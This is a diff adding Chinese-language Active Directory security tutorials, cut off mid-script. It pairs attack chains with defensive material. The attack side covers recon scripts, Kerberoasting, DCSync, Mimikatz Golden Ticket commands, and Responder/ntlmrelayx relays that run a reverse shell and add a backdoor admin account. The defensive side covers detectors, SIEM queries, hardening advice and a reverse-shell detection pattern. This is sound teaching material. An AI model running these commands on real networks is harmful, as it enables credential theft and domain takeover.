@@ -1041,6 +1960,297 @@ bloodhound-python -u admin -p pass -d domain.com -c All
 4. 信任关系
 5. 共享资源
 6. 策略配置
+
+## 实战案例
+
+### 案例：完整的 Active Directory 环境信息收集
+
+\`\`\`
+域信息收集流程：
+
+┌──────────────┐
+│  获取域信息    │  net config / nltest / nslookup
+└──────┬───────┘
+       │
+       ▼
+┌──────────────┐
+│  枚举用户/组   │  net user /domain + LDAP 查询
+└──────┬───────┘
+       │
+       ▼
+┌──────────────┐
+│  收集 SPN     │  Kerberoasting 前置信息收集
+└──────┬───────┘
+       │
+       ▼
+┌──────────────┐
+│  BloodHound   │  全面分析攻击路径
+└──────┬───────┘
+       │
+       ▼
+┌──────────────┐
+│  生成报告     │  识别高价值目标和攻击路径
+└──────────────┘
+\`\`\`
+
+\`\`\`powershell
+# 完整的域信息收集脚本
+
+# === 1. 基础域信息 ===
+Write-Host "\`n[*] ===== 域基础信息 =====" -ForegroundColor Cyan
+
+# 当前用户和域信息
+Write-Host "\`n[+] 当前登录信息:"
+nltest /dsgetdc:$(Get-ADDomain).DNSRoot
+net config workstation
+whoami /all
+
+# 域 SID
+$domainSID = (Get-ADDomain).DomainSID.Value
+Write-Host "[+] 域 SID: $domainSID"
+
+# 域功能级别
+$domain = Get-ADDomain
+Write-Host "[+] 域功能级别: $($domain.DomainMode)"
+Write-Host "[+] 林功能级别: $((Get-ADForest).ForestMode)"
+
+# === 2. 域控制器枚举 ===
+Write-Host "\`n[*] ===== 域控制器 =====" -ForegroundColor Cyan
+Get-ADDomainController -Filter * | ForEach-Object {
+    Write-Host "[+] DC: $($_.Name) | IP: $($_.IPv4Address) | OS: $($_.OperatingSystem)"
+}
+
+# DNS SRV 记录
+nslookup -type=SRV _ldap._tcp.dc._msdcs.$(Get-ADDomain).DNSRoot
+
+# === 3. 域用户枚举 ===
+Write-Host "\`n[*] ===== 域用户 =====" -ForegroundColor Cyan
+Get-ADUser -Filter * -Properties DisplayName, LastLogonDate, PasswordLastSet, Enabled |
+    Where-Object { $_.Enabled -eq $true } |
+    Select-Object Name, DisplayName, LastLogonDate, PasswordLastSet |
+    Format-Table -AutoSize
+
+# 查找不需要预认证的用户（AS-REP Roasting 目标）
+Write-Host "\`n[+] 不需要预认证的用户（AS-REP Roasting）:" -ForegroundColor Yellow
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true -and Enabled -eq $true} |
+    Select-Object Name, SamAccountName
+
+# 查找有 SPN 的用户（Kerberoasting 目标）
+Write-Host "\`n[+] 配置了 SPN 的用户（Kerberoasting）:" -ForegroundColor Yellow
+Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and Enabled -eq $true} -Properties ServicePrincipalName |
+    Select-Object Name, SamAccountName, ServicePrincipalName
+
+# === 4. 域组枚举 ===
+Write-Host "\`n[*] ===== 关键域组 =====" -ForegroundColor Cyan
+
+$importantGroups = @(
+    "Domain Admins",
+    "Enterprise Admins",
+    "Schema Admins",
+    "Administrators",
+    "Account Operators",
+    "Server Operators",
+    "Backup Operators",
+    "DnsAdmins"
+)
+
+foreach ($group in $importantGroups) {
+    $members = Get-ADGroupMember -Identity $group -ErrorAction SilentlyContinue
+    if ($members) {
+        Write-Host "\`n[+] $group 成员:" -ForegroundColor Yellow
+        $members | ForEach-Object {
+            Write-Host "    - $($_.Name) ($($_.objectClass))"
+        }
+    }
+}
+
+# === 5. 信任关系 ===
+Write-Host "\`n[*] ===== 信任关系 =====" -ForegroundColor Cyan
+Get-ADTrust -Filter * | ForEach-Object {
+    Write-Host "[+] 信任: $($_.Name) | 方向: $($_.Direction) | 类型: $($_.TrustType)"
+}
+
+# === 6. 共享资源 ===
+Write-Host "\`n[*] ===== 共享资源 =====" -ForegroundColor Cyan
+Get-SmbShare | Where-Object { $_.Name -notmatch '^$' } |
+    Select-Object Name, Path, Description
+
+# === 7. 组策略枚举 ===
+Write-Host "\`n[*] ===== 组策略 =====" -ForegroundColor Cyan
+Get-GPO -All | Select-Object DisplayName, Id, CreationTime, ModificationTime |
+    Format-Table -AutoSize
+
+# === 8. 计算机枚举 ===
+Write-Host "\`n[*] ===== 域计算机 =====" -ForegroundColor Cyan
+Get-ADComputer -Filter * -Properties OperatingSystem, LastLogonDate |
+    Select-Object Name, DNSHostName, OperatingSystem, LastLogonDate |
+    Format-Table -AutoSize
+
+# === BloodHound 数据收集 ===
+# 使用 SharpHound 收集数据
+# .SharpHound.exe -c All --zipfilename bloodhound_data.zip
+# 或使用 bloodhound-python
+# bloodhound-python -u user -p password -d corp.local -c All
+\`\`\`
+
+\`\`\`python
+# LDAP 信息收集工具
+
+import ldap3
+import json
+from datetime import datetime
+
+class DomainRecon:
+    def __init__(self, domain_controller, domain, username, password):
+        self.dc = domain_controller
+        self.domain = domain
+        self.base_dn = ",".join([f"DC={d}" for d in domain.split(".")])
+        self.server = ldap3.Server(domain_controller, get_info=ldap3.ALL)
+        self.connection = ldap3.Connection(
+            self.server,
+            user=f"{username}@{domain}",
+            password=password,
+            authentication=ldap3.NTLM,
+            auto_bind=True
+        )
+
+    def get_domain_info(self):
+        """获取域基础信息"""
+        self.connection.search(
+            search_base=self.base_dn,
+            search_filter="(objectClass=domain)",
+            attributes=["distinguishedName", "objectSid", "dSCorePropagationData"]
+        )
+        return self.connection.entries
+
+    def get_users(self, enabled_only=True):
+        """枚举域用户"""
+        search_filter = "(&(objectClass=user)(objectCategory=person))"
+        if enabled_only:
+            search_filter = f"(&{search_filter}(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+
+        self.connection.search(
+            search_base=self.base_dn,
+            search_filter=search_filter,
+            attributes=["sAMAccountName", "displayName", "lastLogonTimestamp",
+                       "pwdLastSet", "servicePrincipalName", "memberOf",
+                       "userAccountControl"]
+        )
+
+        users = []
+        for entry in self.connection.entries:
+            uac = int(entry.userAccountControl.value) if entry.userAccountControl.value else 0
+            users.append({
+                "samaccountname": entry.sAMAccountName.value,
+                "displayname": entry.displayName.value,
+                "has_spn": bool(entry.servicePrincipalName.value),
+                "no_preauth": bool(uac & 0x400000),
+                "enabled": not bool(uac & 0x2),
+                "last_logon": str(entry.lastLogonTimestamp.value) if entry.lastLogonTimestamp.value else "Never"
+            })
+
+        return users
+
+    def get_groups(self):
+        """枚举关键组"""
+        important_groups = [
+            "Domain Admins", "Enterprise Admins", "Schema Admins",
+            "Administrators", "Account Operators", "DnsAdmins"
+        ]
+
+        results = {}
+        for group_name in important_groups:
+            self.connection.search(
+                search_base=self.base_dn,
+                search_filter=f"(&(objectClass=group)(cn={group_name}))",
+                attributes=["cn", "member"]
+            )
+            if self.connection.entries:
+                entry = self.connection.entries[0]
+                results[group_name] = {
+                    "members": entry.member.values if entry.member.value else []
+                }
+
+        return results
+
+    def get_computers(self):
+        """枚举域计算机"""
+        self.connection.search(
+            search_base=self.base_dn,
+            search_filter="(objectClass=computer)",
+            attributes=["cn", "dNSHostName", "operatingSystem", "operatingSystemVersion"]
+        )
+
+        computers = []
+        for entry in self.connection.entries:
+            computers.append({
+                "name": entry.cn.value,
+                "hostname": entry.dNSHostName.value if entry.dNSHostName.value else "",
+                "os": entry.operatingSystem.value if entry.operatingSystem.value else "",
+                "os_version": entry.operatingSystemVersion.value if entry.operatingSystemVersion.value else ""
+            })
+
+        return computers
+
+    def generate_report(self):
+        """生成收集报告"""
+        report = {
+            "timestamp": datetime.now().isoformat(),
+            "domain": self.domain,
+            "domain_info": str(self.get_domain_info()),
+            "users": self.get_users(),
+            "groups": self.get_groups(),
+            "computers": self.get_computers()
+        }
+
+        # 统计
+        users = report["users"]
+        spn_users = [u for u in users if u["has_spn"]]
+        no_preauth = [u for u in users if u["no_preauth"]]
+
+        report["summary"] = {
+            "total_users": len(users),
+            "enabled_users": len([u for u in users if u["enabled"]]),
+            "kerberoastable": len(spn_users),
+            "asreproastable": len(no_preauth),
+            "total_computers": len(report["computers"])
+        }
+
+        return report
+
+if __name__ == "__main__":
+    recon = DomainRecon(
+        domain_controller="dc.corp.local",
+        domain="corp.local",
+        username="administrator",
+        password="P@ssw0rd123"
+    )
+
+    report = recon.generate_report()
+    print(json.dumps(report, indent=2, ensure_ascii=False, default=str))
+\`\`\`
+
+## 安全加固
+
+1. **限制 LDAP 信息泄露**
+   - 配置域控制器禁用匿名 LDAP 查询
+   - 限制 \`Authenticated Users\` 组对敏感属性的读取权限
+   - 启用 LDAP 签名和 LDAP channel binding
+
+2. **用户账户保护**
+   - 为所有服务账户设置复杂的长密码（>25 字符）
+   - 避免服务账户的密码与管理员密码相同
+   - 定期轮换服务账户密码，使用 gMSA（Group Managed Service Accounts）
+
+3. **SPN 管理**
+   - 审计和清理不必要的 SPN 记录
+   - 使用 \`setspn -Q */*\` 检查 SPN 重复
+   - 限制 \`ReadSPN\` 权限，阻止 Kerberoasting 信息收集
+
+4. **BloodHound 防御**
+   - 部署蜜罐用户账户，设置高价值 SPN 监控
+   - 监控 SharpHound / BloodHound Python 的 LDAP 查询模式
+   - 使用 Windows ATA / Azure ATP 检测目录侦察行为
     `
   },
   {
@@ -1112,6 +2322,225 @@ kerberos::golden /user:administrator /domain:domain.com /sid:S-1-5-21-... /krbtg
 - 限制 DCSync 权限
 - 定期更改 krbtgt 密码
 - 启用 LAPS
+
+## 实战案例
+
+### 案例：从域用户到域控的完整攻击链
+
+\`\`\`
+域控攻击路径：
+
+┌──────────────┐
+│  普通域用户    │
+└──────┬───────┘
+       │
+       ├──────────────────────────────┐
+       ▼                              ▼
+┌──────────────┐              ┌──────────────┐
+│ Kerberoasting │              │ AS-REP       │
+│ 获取服务票据   │              │ Roasting     │
+└──────┬───────┘              └──────┬───────┘
+       │ 离线破解 SPN 密码             │ 破解无预认证用户密码
+       ▼                              ▼
+┌──────────────┐              ┌──────────────┐
+│ 获得服务账户   │              │ 获得用户凭据   │
+│ 权限         │              │              │
+└──────┬───────┘              └──────┬───────┘
+       │                              │
+       └──────────┬───────────────────┘
+                  ▼
+         ┌──────────────┐
+         │  DCSync       │──→ 获取 krbtgt 哈希
+         └──────┬───────┘
+                ▼
+         ┌──────────────┐
+         │  Golden Ticket│──→ 域内任意身份伪造
+         └──────────────┘
+\`\`\`
+
+\`\`\`powershell
+# 完整的域控攻击链演示（授权红队测试环境）
+
+# === 阶段1：Kerberoasting ===
+Write-Host "[*] 执行 Kerberoasting 攻击..." -ForegroundColor Yellow
+
+# 方法1：使用 Rubeus
+.Rubeus.exe kerberoast /outfile:spn_hashes.txt /stat
+
+# 方法2：PowerShell 手动请求
+Add-Type -AssemblyName System.IdentityModel
+$spns = Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and Enabled -eq $true} -Properties ServicePrincipalName, ServicePrincipalNames
+
+foreach ($spn in $spns) {
+    $spnName = $spn.ServicePrincipalName
+    Write-Host "[*] 请求 SPN: $spnName"
+
+    try {
+        $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spnName
+        $ticket = $token.GetRequest()
+        # 保存 TGS 票据用于离线破解
+        [System.IO.File]::WriteAllBytes("$PWD\tickets$($spn.SamAccountName).kirbi", $ticket)
+    } catch {
+        Write-Host "[-] 请求失败: $_" -ForegroundColor Red
+    }
+}
+
+# 离线破解（使用 hashcat）
+# hashcat -m 13100 spn_hashes.txt wordlist.txt -r rules/best64.rule
+
+# === 阶段2：获取服务账户凭据后的横向移动 ===
+# 假设已破解获得服务账户 svc_web 的密码
+$servicePassword = "Summer2024!"
+$secPassword = ConvertTo-SecureString $servicePassword -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("CORPsvc_web", $secPassword)
+
+# 测试凭据
+Invoke-Command -ComputerName WEB01 -Credential $cred -ScriptBlock { whoami }
+
+# === 阶段3：DCSync ===
+Write-Host "[*] 执行 DCSync..." -ForegroundColor Yellow
+
+# 使用 Mimikatz 执行 DCSync（需要域管或 DCSync 权限）
+.mimikatz.exe "lsadump::dcsync /user:krbtgt /domain:corp.local" "exit"
+
+# 或使用 impacket（Linux 环境）
+# secretsdump.py CORP/administrator:P@ssw0rd123@dc01.corp.local -just-dc-ntlm
+
+# === 阶段4：Golden Ticket ===
+Write-Host "[*] 生成 Golden Ticket..." -ForegroundColor Yellow
+
+# krbtgt NTLM 哈希（从 DCSync 获取）
+$krbtgtHash = "83b2683e6d128988be802be43be6b800"
+$domainSID = "S-1-5-21-1234567890-1234567890-1234567890"
+
+# 使用 Mimikatz 生成
+.mimikatz.exe "kerberos::golden /user:administrator /domain:corp.local /sid:$domainSID /krbtgt:$krbtgtHash /ptt" "exit"
+
+# 验证
+klist
+# 现在可以使用 administrator 身份访问域内任何资源
+\`\`\`
+
+\`\`\`python
+# DCSync 检测规则（防御方使用）
+
+import re
+from datetime import datetime
+
+class DCSyncDetector:
+    """
+    检测 DCSync 攻击的 SIEM 规则引擎
+    DCSync 特征：非 DC 主机发起目录复制请求
+    """
+
+    # DCSync 相关的 Windows 事件 ID
+    EVENT_IDS = {
+        "4662": "目录服务访问",  # 关键检测点
+        "4624": "登录成功",
+        "4672": "特殊权限分配",
+    }
+
+    # 目录复制相关的 GUID
+    DS_REPL_GUID = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes
+    DS_REPL_ALL_GUID = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes-All
+
+    def __init__(self, domain_controllers):
+        self.known_dcs = set(domain_controllers)
+
+    def analyze_event(self, event):
+        """
+        分析 Windows 安全日志事件
+        检测是否存在 DCSync 攻击行为
+        """
+        alerts = []
+
+        if event.get("EventID") == 4662:
+            properties = event.get("Properties", [])
+
+            # 检查是否请求了目录复制权限
+            has_replication = False
+            for prop in properties:
+                if self.DS_REPL_GUID in prop or self.DS_REPL_ALL_GUID in prop:
+                    has_replication = True
+                    break
+
+            if has_replication:
+                source_host = event.get("SubjectUserName", "")
+                source_ip = event.get("IpAddress", "")
+
+                # 关键检测：非 DC 主机是否执行了 DCSync
+                if source_host not in self.known_dcs:
+                    alert = {
+                        "severity": "CRITICAL",
+                        "type": "DCSync Attack Detected",
+                        "timestamp": event.get("TimeCreated"),
+                        "source_user": source_host,
+                        "source_ip": source_ip,
+                        "target_object": event.get("ObjectName"),
+                        "recommendation": "立即隔离源主机，检查是否存在凭据泄露"
+                    }
+                    alerts.append(alert)
+
+        return alerts
+
+    def generate_hunting_query(self):
+        """生成日志狩猎查询"""
+        query = """
+// Microsoft Sentinel / Splunk 查询：检测 DCSync 攻击
+// 在 Windows 安全日志中搜索目录复制请求
+
+EventID=4662
+AND Properties:"*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*"
+OR Properties:"*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*"
+| where NOT match(SubjectUserName, "^(DC|MS-AD.*)$")
+| stats count by SubjectUserName, IpAddress, ObjectName
+| where count > 1
+| sort -count
+"""
+        return query
+
+# 使用示例
+detector = DCSyncDetector(domain_controllers=["DC01$", "DC02$"])
+
+# 模拟检测
+test_event = {
+    "EventID": 4662,
+    "TimeCreated": "2024-01-15T14:23:45Z",
+    "SubjectUserName": "administrator",
+    "IpAddress": "192.168.1.50",
+    "ObjectName": "DC=corp,DC=local",
+    "Properties": ["1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"]
+}
+
+alerts = detector.analyze_event(test_event)
+if alerts:
+    for alert in alerts:
+        print(f"[!] {alert['severity']}: {alert['type']}")
+        print(f"    源: {alert['source_user']} ({alert['source_ip']})")
+        print(f"    建议: {alert['recommendation']}")
+\`\`\`
+
+## 安全加固
+
+1. **DCSync 防御**
+   - 使用 \`Get-ADPermission\` 审计具有目录复制权限的账户
+   - 限制 \`Replicating Directory Changes\` 和 \`Replicating Directory Changes All\` 权限
+   - 监控 4662 事件中的目录复制 GUID
+
+2. **Kerberos 安全**
+   - 定期（每180天）更改 krbtgt 密码（需改两次，间隔12小时）
+   - 监控异常 TGS 请求和 Kerberoasting 行为
+   - 为服务账户配置 AES256 加密，避免使用 RC4
+
+3. **AS-REP Roasting 防御**
+   - 审计所有 \`DoesNotRequirePreAuth\` 设置为 True 的账户
+   - 启用账户预认证（默认应启用）
+   - 监控 4768 事件中 Pre-Authentication Type = 0 的请求
+
+4. **特权账户管理**
+   - 实施 Tier Model（Tier 0/1/2）隔离域管账户
+   - 域管账户仅在域控制器上登录
+   - 使用 PAW（Privileged Access Workstation）管理域控
     `
   },
   {
@@ -1183,6 +2612,191 @@ Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-All
 - **Mimikatz**：凭据获取
 - **Impacket**：网络协议攻击
 - **Responder**：LLMNR/NBT-NS 欺骗
+
+## 实战案例
+
+### 案例：Responder + NTLM Relay 攻击链
+
+\`\`\`
+Responder + NTLM Relay 攻击流程：
+
+┌──────────────┐        ┌──────────────┐
+│  攻击者       │        │  受害者主机    │
+│  10.10.14.5   │        │  10.10.10.100 │
+└──────┬───────┘        └──────┬───────┘
+       │                       │
+       │  1. 启动 Responder     │
+       │  毒化 LLMNR/NBT-NS    │
+       │◄──────────────────────│ 用户输入错误的 UNC 路径
+       │                       │
+       │  2. 捕获 NTLMv2 哈希   │
+       │  或触发 NTLM 认证      │
+       │                       │
+       ▼                       │
+┌──────────────┐               │
+│ ntlmrelayx   │──── 3. Relay ──→ ┌──────────────┐
+│ 转发认证      │    到目标服务     │  目标服务      │
+└──────────────┘               │  (SMB/HTTP/LDAP)│
+                               └──────────────┘
+\`\`\`
+
+\`\`\`bash
+# Responder + NTLM Relay 完整攻击演示（授权测试环境）
+
+# === 阶段1：启动 Responder ===
+# 在 Kali Linux (10.10.14.5) 上
+responder -I eth0 -wrf -v
+
+# Responder 配置关键选项：
+# -w: WPAD 毒化
+# -r: NBT-NS 毒化
+# -f: LLMNR 毒化
+# -v: 详细输出
+
+# === 阶段2：等待受害者触发 ===
+# 当受害者在资源管理器中输入 \\fileshare 时
+# Windows 会发送 LLMNR/NBT-NS 广播查询
+# Responder 毒化响应，将流量重定向到攻击者
+
+# === 阶段3：NTLM Relay ===
+# 启动 ntlmrelayx 进行 Relay 攻击
+ntlmrelayx.py -t 10.10.10.200 -smb2support -e reverse_shell.exe
+
+# 或者 Relay 到 LDAP 进行目录操作
+ntlmrelayx.py -t ldap://dc01.corp.local -t-aad -l loot.txt
+
+# === 阶段4： Relay 到 SMB 远程执行 ===
+ntlmrelayx.py -t 10.10.10.200 -smb2support -c "net user backdoor P@ss12345 /add && net localgroup administrators backdoor /add"
+
+# === 阶段5：Relay 到 HTTP 进行 WPAD 代理 ===
+# Responder 配合 WPAD
+# 受害者浏览器通过 WPAD 获取代理配置
+# 代理指向攻击者的 ntlmrelayx
+\`\`\`
+
+\`\`\`python
+# NTLM Relay 攻击检测脚本（防御方使用）
+
+import re
+from collections import defaultdict
+from datetime import datetime, timedelta
+
+class NTLMRelayDetector:
+    """
+    检测 NTLM Relay 和 LLMNR/NBT-NS 毒化攻击
+    """
+
+    def __init__(self):
+        self.auth_events = []
+        self.relay_threshold = 5  # 同一用户短时间内多次认证
+        self.time_window = timedelta(minutes=2)
+
+    def analyze_auth_events(self, events):
+        """分析认证事件检测 Relay 攻击"""
+        alerts = []
+
+        # 按源 IP 和用户分组
+        grouped = defaultdict(list)
+        for event in events:
+            key = (event.get("SourceIP"), event.get("TargetUser"))
+            grouped[key].append(event)
+
+        for (source_ip, target_user), event_list in grouped.items():
+            # 检测短时间内多次 NTLM 认证到不同目标
+            targets = set()
+            for event in event_list:
+                targets.add(event.get("TargetHost"))
+                event_time = datetime.fromisoformat(event.get("Timestamp"))
+
+            if len(targets) > 3:
+                alert = {
+                    "severity": "HIGH",
+                    "type": "Potential NTLM Relay Attack",
+                    "description": f"IP {source_ip} 在短时间内对 {len(targets)} 个不同目标进行 NTLM 认证",
+                    "source_ip": source_ip,
+                    "user": target_user,
+                    "targets": list(targets),
+                    "recommendation": "检查是否为 LLMNR/NBT-NS 毒化，考虑禁用 LLMNR"
+                }
+                alerts.append(alert)
+
+            # 检测异常的 NTLM 认证模式
+            # 正常：用户在自己主机上认证到文件服务器
+            # 异常：多个不同用户从同一 IP 认证
+            users_from_ip = set()
+            for event in event_list:
+                users_from_ip.add(event.get("TargetUser"))
+
+            if len(users_from_ip) > 3:
+                alerts.append({
+                    "severity": "HIGH",
+                    "type": "LLMNR/NBT-NS Poisoning Suspected",
+                    "description": f"从 {source_ip} 有 {len(users_from_ip)} 个不同用户进行 NTLM 认证",
+                    "users": list(users_from_ip),
+                    "recommendation": "在网关/交换机上检测 LLMNR/NBT-NS 广播"
+                })
+
+        return alerts
+
+    def generate_splunk_query(self):
+        """生成 Splunk 检测查询"""
+        return """
+index=windows EventCode=4624 LogonType=3 AuthenticationPackageName=NTLM
+| stats dc(TargetUserName) as unique_users by IpAddress
+| where unique_users > 3
+| sort -unique_users
+| eval severity=case(unique_users>10,"CRITICAL", unique_users>5,"HIGH", true(),"MEDIUM")
+"""
+
+    def generate_sentinel_query(self):
+        """生成 Microsoft Sentinel 检测查询"""
+        return """
+SigninLogs
+| where AuthenticationMethod == "NTLM"
+| summarize unique_users = dcount(UserPrincipalName) by IPAddress, bin(TimeGenerated, 5m)
+| where unique_users > 3
+| order by unique_users desc
+"""
+
+# 使用示例
+detector = NTLMRelayDetector()
+
+sample_events = [
+    {"SourceIP": "10.10.10.50", "TargetUser": "user1", "TargetHost": "WEB01", "Timestamp": "2024-01-15T14:23:00"},
+    {"SourceIP": "10.10.10.50", "TargetUser": "user2", "TargetHost": "WEB02", "Timestamp": "2024-01-15T14:23:05"},
+    {"SourceIP": "10.10.10.50", "TargetUser": "user3", "TargetHost": "WEB03", "Timestamp": "2024-01-15T14:23:10"},
+    {"SourceIP": "10.10.10.50", "TargetUser": "user4", "TargetHost": "FILE01", "Timestamp": "2024-01-15T14:23:15"},
+]
+
+alerts = detector.analyze_auth_events(sample_events)
+for alert in alerts:
+    print(f"[!] {alert['severity']}: {alert['type']}")
+    print(f"    {alert['description']}")
+    print(f"    建议: {alert['recommendation']}")
+\`\`\`
+
+## 安全加固
+
+1. **禁用 LLMNR / NBT-NS**
+   - 通过组策略禁用 LLMNR：\`Computer Configuration > Administrative Templates > Network > DNS Client > Turn off multicast name resolution\`
+   - 通过组策略禁用 NBT-NS：\`NetBIOS over TCPIP = Disabled\`
+   - 配置 DNS 后缀搜索列表，避免 NetBIOS 名称解析
+
+2. **NTLM Relay 防御**
+   - 启用 SMB 签名（Group Policy: Microsoft network server: Digitally sign communications）
+   - 启用 EPA（Extended Protection for Authentication）
+   - 启用 LDAP 签名和 channel binding
+   - 配置 HTTP 服务器的 NTLM Relay 防护（NTLMRelayX → EPA → 失败）
+
+3. **NTLM 限制策略**
+   - 使用 \`NetNTLMv2\` 替代 NTLMv1（Group Policy: Network security: LAN Manager authentication level）
+   - 考虑完全禁用 NTLM，强制使用 Kerberos
+   - 使用 \`Deny log on through Remote Desktop Services\` 限制 NTLM 使用
+
+4. **监控检测**
+   - 部署 Responder 检测：监控 LLMNR/NBT-NS 广播中的异常响应
+   - 使用网络 IDS 检测 NTLM Relay 模式
+   - 监控 4624 LogonType=3 NTLM 事件中的异常源 IP
     `
   },
   // 应急响应 - 补充
@@ -1271,6 +2885,419 @@ systemctl list-unit-files --type=service
 - SUID 文件
 - 异常计划任务
 - 异常网络连接
+
+## 实战案例
+
+### 案例：Web 服务器被入侵后的完整应急响应
+
+\`\`\`
+Linux 应急响应流程：
+
+┌──────────────┐
+│  事件检测     │  WAF 告警 / 用户报告 / 异常流量
+└──────┬───────┘
+       │
+       ▼
+┌──────────────┐
+│  隔离受感染   │  断网 / 阻断攻击源 IP / 保留现场
+└──────┬───────┘
+       │
+       ▼
+┌──────────────────────────────────────┐
+│              排查阶段                  │
+├──────┬──────┬──────┬──────┬──────────┤
+│ 账户  │ 进程  │ 文件  │ 日志  │ 网络     │
+└──────┴──────┴──────┴──────┴──────────┘
+       │
+       ▼
+┌──────────────┐
+│  攻击还原     │  时间线分析 / 攻击链还原
+└──────┬───────┘
+       │
+       ▼
+┌──────────────┐
+│  清除与恢复   │  删除后门 / 修补漏洞 / 恢复服务
+└──────────────┘
+\`\`\`
+
+\`\`\`bash
+# 完整的 Linux 应急响应操作手册
+
+# === 阶段1：现场保护 ===
+# 记录当前状态，不要直接操作
+echo "[*] 开始应急响应 - $(date)" > /tmp/ir_$(date +%Y%m%d_%H%M%S).log
+
+# 保存进程和网络快照
+ps auxf > /tmp/ps_snapshot.txt
+netstat -antlp > /tmp/netstat_snapshot.txt
+ss -antlp >> /tmp/netstat_snapshot.txt
+lsof -i > /tmp/lsof_snapshot.txt
+
+# 保存内存快照（如果需要取证）
+# LiME 加载内核模块
+# insmod lime.ko "path=/tmp/memory.lime format=lime"
+
+# === 阶段2：账户排查 ===
+echo "[*] === 账户安全排查 ==="
+
+# 检查新增用户
+echo "[+] UID=0 的用户:"
+awk -F: '$3==0{print $1}' /etc/passwd
+
+echo "[+] 可登录的用户:"
+grep -v '/nologin|/false' /etc/passwd
+
+echo "[+] 最近修改的用户（/etc/passwd）:"
+find /etc/passwd -mtime -7 -exec ls -la {} ;
+
+echo "[+] /etc/passwd 最后10行:"
+tail -10 /etc/passwd
+
+echo "[+] /etc/shadow 权限检查:"
+ls -la /etc/shadow
+
+echo "[+] sudoers 文件:"
+cat /etc/sudoers 2>/dev/null
+cat /etc/sudoers.d/* 2>/dev/null
+
+# 检查 SSH authorized_keys
+echo "[+] 所有用户的 authorized_keys:"
+find / -name "authorized_keys" -type f 2>/dev/null | while read f; do
+    echo "--- $f ---"
+    ls -la "$f"
+    cat "$f"
+done
+
+# === 阶段3：进程排查 ===
+echo "[*] === 进程排查 ==="
+
+echo "[+] CPU 使用最高的进程:"
+ps aux --sort=-%cpu | head -20
+
+echo "[+] 内存使用最高的进程:"
+ps aux --sort=-%mem | head -20
+
+echo "[+] 可疑进程（非 root 但有网络连接）:"
+netstat -antlp 2>/dev/null | grep -v "127.0.0.1" | awk '{print $7}' | sort -u | while read pid; do
+    proc_user=$(ps -o user= -p $pid 2>/dev/null)
+    proc_name=$(ps -o comm= -p $pid 2>/dev/null)
+    proc_cmd=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ')
+    if [ "$proc_user" != "root" ] && [ -n "$proc_name" ]; then
+        echo "[!] PID=$pid USER=$proc_user CMD=$proc_name $proc_cmd"
+    fi
+done
+
+echo "[+] 异常的 /tmp 目录下可执行文件:"
+find /tmp -type f -executable -ls 2>/dev/null
+
+echo "[+] 隐藏进程:"
+ps aux | grep -E "^s*[0-9]+.*." | head -20
+
+# === 阶段4：文件排查 ===
+echo "[*] === 文件排查 ==="
+
+echo "[+] 最近24小时修改的文件（/etc）:"
+find /etc -mtime -1 -type f -ls 2>/dev/null
+
+echo "[+] 最近24小时修改的文件（/usr）:"
+find /usr -mtime -1 -type f -ls 2>/dev/null
+
+echo "[+] SUID 文件:"
+find / -perm -4000 -type f -ls 2>/dev/null
+
+echo "[+] SGID 文件:"
+find / -perm -2000 -type f -ls 2>/dev/null
+
+echo "[+] 可写目录（非 /tmp）:"
+find / -writable -type d ! -path "/tmp*" ! -path "/proc*" ! -path "/sys*" 2>/dev/null
+
+echo "[+] 隐藏文件（/root）:"
+find /root -name ".*" -type f -ls 2>/dev/null
+
+echo "[+] Web 目录可疑文件:"
+find /var/www -name "*.php" -mtime -1 -ls 2>/dev/null
+find /var/www -name "*.jsp" -mtime -1 -ls 2>/dev/null
+find /var/www -name "*.sh" -type f -ls 2>/dev/null
+
+# === 阶段5：日志分析 ===
+echo "[*] === 日志分析 ==="
+
+echo "[+] SSH 暴力破解尝试:"
+grep "Failed password" /var/log/auth.log 2>/dev/null | 
+    awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -20
+
+echo "[+] SSH 成功登录:"
+grep "Accepted" /var/log/auth.log 2>/dev/null | tail -20
+
+echo "[+] sudo 使用记录:"
+grep "sudo:" /var/log/auth.log 2>/dev/null | tail -20
+
+echo "[+] 异常 cron 任务:"
+for user in $(cut -f1 -d: /etc/passwd); do
+    cron=$(crontab -u $user -l 2>/dev/null)
+    if [ -n "$cron" ]; then
+        echo "--- $user ---"
+        echo "$cron"
+    fi
+done
+
+# 检查系统级 cron
+echo "[+] 系统 cron 任务:"
+ls -la /etc/cron.d/
+ls -la /etc/cron.daily/
+cat /etc/crontab
+
+# === 阶段6：网络排查 ===
+echo "[*] === 网络排查 ==="
+
+echo "[+] 当前网络连接:"
+netstat -antlp
+
+echo "[+] 异常外部连接（非标准端口）:"
+netstat -antlp | grep ESTABLISHED | grep -v -E ":(80|443|22|3306|5432|6379) "
+
+echo "[+] 防火墙规则:"
+iptables -L -n -v
+
+echo "[+] DNS 配置:"
+cat /etc/resolv.conf
+
+echo "[+] hosts 文件:"
+cat /etc/hosts
+\`\`\`
+
+\`\`\`python
+# 自动化 Linux IR 检查脚本
+
+import os
+import subprocess
+import re
+import json
+from datetime import datetime
+
+class LinuxIR:
+    def __init__(self):
+        self.findings = []
+        self.timeline = []
+
+    def check_suspicious_processes(self):
+        """检查可疑进程"""
+        suspicious = []
+
+        try:
+            # 获取所有进程
+            result = subprocess.check_output(
+                ["ps", "aux", "--sort=-pcpu"],
+                text=True
+            )
+
+            for line in result.splitlines()[1:]:
+                parts = line.split(None, 10)
+                if len(parts) < 11:
+                    continue
+
+                user, pid, cpu, mem = parts[0], parts[1], parts[2], parts[3]
+                command = parts[10]
+
+                # 检测可疑特征
+                reasons = []
+                if "/tmp/" in command or "/dev/shm/" in command:
+                    reasons.append("临时目录执行")
+                if "bash -i" in command and "/dev/tcp" in command:
+                    reasons.append("反弹 shell")
